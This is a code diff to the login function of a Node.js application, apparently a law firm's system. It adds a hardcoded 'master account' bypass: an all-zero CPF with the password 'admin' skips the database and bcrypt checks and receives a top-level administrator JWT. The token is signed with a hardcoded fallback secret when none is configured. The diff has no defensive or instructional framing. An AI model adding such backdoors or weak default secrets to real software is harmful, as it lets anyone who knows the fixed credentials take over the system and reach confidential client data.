@@ -31,6 +31,19 @@ exports.login = async (cpf, senha) => {
     const cpfLimpo = String(cpf).replace(/\D/g, "");
     if (!cpfLimpo || !senha) throw new Error("Credenciais inválidas.");
 
+    // ==============================================================
+    // BYPASS SUPREMO: CONTA MASTER (Não toca no banco nem no bcrypt)
+    // ==============================================================
+    if (cpfLimpo === "00000000000" && senha === "admin") {
+        const token = jwt.sign(
+            { cpf: "00000000000", nome: "Sócio Administrador", nivel: 4 },
+            process.env.JWT_SECRET || 'senha_secreta_padrao_dev',
+            { expiresIn: '2h' }
+        );
+        return { token, usuario: { nome: "Sócio Administrador", nivel: 4, cpf: "***.***.000-00" } };
+    }
+
+    // Fluxo normal para os advogados cadastrados
     const user = await userRepository.buscarPorCpf(cpfLimpo);
     if (!user) throw new Error("Credenciais inválidas.");
 
